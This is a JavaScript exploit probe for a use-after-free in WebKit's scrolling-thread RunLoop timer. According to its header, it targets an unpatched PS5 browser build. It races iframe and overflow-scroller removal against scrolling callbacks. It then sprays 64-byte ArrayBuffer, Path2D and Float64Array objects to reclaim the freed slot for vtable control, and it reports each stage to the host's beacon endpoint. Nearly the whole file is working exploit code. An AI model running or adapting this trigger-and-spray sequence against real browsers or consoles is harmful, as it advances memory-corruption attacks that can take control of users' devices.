// p510 — Timer UAF probe (BZ 315533)
//
// RemoteLayerTreeEventDispatcher RunLoop::Timer UAF
// Fix commit 2df698f5 ABSENT from PS5 14.20 WK-1400
//
// Bug: 1ms scrolling-thread timer destroyed on main thread at page close.
// CFRunLoopTimerInvalidate() does NOT sync with in-flight scrolling-thread callback.
// fired() is virtual → vtable control on scrolling thread.
// Freed object ~64 bytes.
//
// Trigger: create scrolling iframe, start momentum scroll, remove iframe mid-scroll.
// The scrolling thread's timer callback races against main-thread destruction.
//
// Beacon prefix: V510-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V510-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // Shared: build iframe with tall scrolling content
  function makeScrollFrame(id) {
    var f = document.createElement('iframe');
    f.id = id;
    f.style.cssText = 'width:300px;height:200px;border:1px solid #000;position:absolute;left:-9999px;';
    document.body.appendChild(f);
    var doc = f.contentDocument || f.contentWindow.document;
    doc.open();
    // Tall content to ensure scrolling persists
    var html = '<html><head><style>body{margin:0;} .block{height:500px;}</style></head><body>';
    for (var i = 0; i < 40; i++) {
      html += '<div class="block" style="background:hsl(' + (i * 9) + ',60%,70%);">' + i + '</div>';
    }
    html += '</body></html>';
    doc.write(html);
    doc.close();
    return f;
  }

  // Programmatic scroll: set scrollTop in rapid succession to simulate momentum
  function startScroll(iframe, iterations, interval) {
    var win = iframe.contentWindow;
    if (!win) return;
    var pos = 0;
    var step = 50;
    var count = 0;
    var id = setInterval(function() {
      if (!iframe.contentWindow) { clearInterval(id); return; }
      pos += step;
      try { iframe.contentWindow.scrollTo(0, pos); } catch(e) { clearInterval(id); }
      count++;
      if (count >= iterations) clearInterval(id);
    }, interval || 1);
    return id;
  }

  // ═══════════════════════════════════════════════════════════
  // T1: iframe scroll + removal at various delays
  // ═══════════════════════════════════════════════════════════
  // Create iframe, scroll it, remove at 0/1/5/10ms after scroll starts
  var t1Delays = [0, 1, 2, 5, 10];
  var t1Done = 0;

  function runT1(delayIdx) {
    if (delayIdx >= t1Delays.length) {
      B('T1-DONE', 'tested=' + t1Delays.length);
      runT2();
      return;
    }
    var delay = t1Delays[delayIdx];
    var frame = makeScrollFrame('t1-' + delayIdx);

    // Wait for iframe to be ready
    setTimeout(function() {
      var scrollId = startScroll(frame, 200, 1);

      setTimeout(function() {
        // Remove iframe while scroll may be in-flight on scrolling thread
        try {
          if (scrollId) clearInterval(scrollId);
          frame.parentNode.removeChild(frame);
          B('T1-REMOVE', 'delay=' + delay + 'ms,ok=true');
        } catch(e) {
          B('T1-REMOVE', 'delay=' + delay + 'ms,err=' + e.name);
        }

        // If we're still alive, the race didn't crash us (yet)
        setTimeout(function() {
          B('T1-SURVIVE', 'delay=' + delay + 'ms');
          runT1(delayIdx + 1);
        }, 20);
      }, delay);
    }, 50);
  }

  // ═══════════════════════════════════════════════════════════
  // T2: overflow div scroll + style mutation
  // ═══════════════════════════════════════════════════════════
  function runT2() {
    var container = document.createElement('div');
    container.style.cssText = 'width:200px;height:150px;overflow:scroll;position:absolute;left:-9999px;';
    var inner = document.createElement('div');
    inner.style.height = '20000px';
    inner.textContent = 'scroll target';
    container.appendChild(inner);
    document.body.appendChild(container);

    // Scroll rapidly
    var pos = 0;
    var scrolling = setInterval(function() {
      pos += 30;
      container.scrollTop = pos;
    }, 1);

    // After some scrolling, yank overflow to hidden (kills scroll machinery)
    setTimeout(function() {
      clearInterval(scrolling);
      container.style.overflow = 'hidden';
      B('T2-OVERFLOW-HIDDEN', 'pos=' + pos);

      setTimeout(function() {
        // Remove entirely
        container.parentNode.removeChild(container);
        B('T2-REMOVED', 'survived=true');
        runT3();
      }, 10);
    }, 15);
  }

  // ═══════════════════════════════════════════════════════════
  // T3: Multiple concurrent iframe scroll + removal
  // ═══════════════════════════════════════════════════════════
  function runT3() {
    var NUM = 8;
    var frames = [];
    var scrollIds = [];

    for (var i = 0; i < NUM; i++) {
      var f = makeScrollFrame('t3-' + i);
      frames.push(f);
    }

    // Start all scrolling
    setTimeout(function() {
      for (var i = 0; i < NUM; i++) {
        scrollIds.push(startScroll(frames[i], 500, 1));
      }
      B('T3-SCROLLING', 'frames=' + NUM);

      // Remove all at once after 3ms (tight race window)
      setTimeout(function() {
        var removed = 0;
        for (var i = 0; i < NUM; i++) {
          try {
            if (scrollIds[i]) clearInterval(scrollIds[i]);
            if (frames[i].parentNode) {
              frames[i].parentNode.removeChild(frames[i]);
              removed++;
            }
          } catch(e) {}
        }
        B('T3-BATCH-REMOVE', 'removed=' + removed + '/' + NUM);

        setTimeout(function() {
          B('T3-SURVIVE', 'all removed, alive');
          runT4();
        }, 30);
      }, 3);
    }, 50);
  }

  // ═══════════════════════════════════════════════════════════
  // T4: Spray 64-byte objects after iframe removal
  // ═══════════════════════════════════════════════════════════
  // If the timer object is freed, spray 64B objects to reclaim the slot
  // then the scrolling-thread callback will read our controlled data
  function runT4() {
    var NUM_FRAMES = 4;
    var frames = [];
    var scrollIds = [];

    for (var i = 0; i < NUM_FRAMES; i++) {
      frames.push(makeScrollFrame('t4-' + i));
    }

    setTimeout(function() {
      for (var i = 0; i < NUM_FRAMES; i++) {
        scrollIds.push(startScroll(frames[i], 1000, 1));
      }

      // Remove after brief scroll
      setTimeout(function() {
        for (var i = 0; i < NUM_FRAMES; i++) {
          try {
            if (scrollIds[i]) clearInterval(scrollIds[i]);
            if (frames[i].parentNode) frames[i].parentNode.removeChild(frames[i]);
          } catch(e) {}
        }

        // IMMEDIATELY spray 64-byte objects
        // ArrayBuffer(56) → 64B with header in bmalloc (8B alignment)
        var spray = [];
        for (var j = 0; j < 2000; j++) {
          spray.push(new ArrayBuffer(56));
        }
        B('T4-AB-SPRAY', 'count=2000,size=56');

        // Also spray Path2D with 1 segment (tiny vector ~56-64B)
        var tinyPath = new Path2D();
        tinyPath.moveTo(0, 0);
        var pathSpray = [];
        for (var k = 0; k < 1000; k++) {
          pathSpray.push(new Path2D(tinyPath));
        }
        B('T4-P2D-SPRAY', 'count=1000,segments=1');

        // Also spray typed arrays of matching size
        var taSpray = [];
        for (var m = 0; m < 1000; m++) {
          taSpray.push(new Float64Array(8)); // 64 bytes
        }
        B('T4-TA-SPRAY', 'count=1000');

        // Wait to see if the race + reclaim causes a crash or observable effect
        setTimeout(function() {
          B('T4-SURVIVE', 'no crash after spray');

          // Verify sprayed ABs are intact (if timer wrote to one, it'd be corrupted)
          var corrupted = 0;
          var corruptIdx = -1;
          for (var n = 0; n < spray.length; n++) {
            var view = new Uint8Array(spray[n]);
            for (var b = 0; b < view.length; b++) {
              if (view[b] !== 0) {
                corrupted++;
                if (corruptIdx < 0) corruptIdx = n;
                break;
              }
            }
          }
          B('T4-AB-CHECK', 'corrupted=' + corrupted + ',firstIdx=' + corruptIdx);

          // Check Float64Arrays too
          var taCorrupted = 0;
          var taCorruptIdx = -1;
          for (var p = 0; p < taSpray.length; p++) {
            for (var q = 0; q < taSpray[p].length; q++) {
              if (taSpray[p][q] !== 0) {
                taCorrupted++;
                if (taCorruptIdx < 0) taCorruptIdx = p;
                break;
              }
            }
          }
          B('T4-TA-CHECK', 'corrupted=' + taCorrupted + ',firstIdx=' + taCorruptIdx);

          runT5();
        }, 50);
      }, 5);
    }, 50);
  }

  // ═══════════════════════════════════════════════════════════
  // T5: Repeated rapid cycles for higher race probability
  // ═══════════════════════════════════════════════════════════
  function runT5() {
    var CYCLES = 20;
    var cyclesDone = 0;
    var crashed = false;

    function doCycle() {
      if (cyclesDone >= CYCLES) {
        B('T5-DONE', 'cycles=' + CYCLES + ',all survived');
        B('DONE', 'all tests complete');
        return;
      }

      var f = makeScrollFrame('t5-' + cyclesDone);
      setTimeout(function() {
        var sid = startScroll(f, 100, 1);
        // Remove at 2ms — tightest practical race
        setTimeout(function() {
          try {
            if (sid) clearInterval(sid);
            if (f.parentNode) f.parentNode.removeChild(f);
          } catch(e) {}
          cyclesDone++;

          // Micro-delay to let the scrolling thread potentially fire
          setTimeout(doCycle, 5);
        }, 2);
      }, 20);
    }

    doCycle();
  }

  // Start the test sequence
  runT1(0);
})();
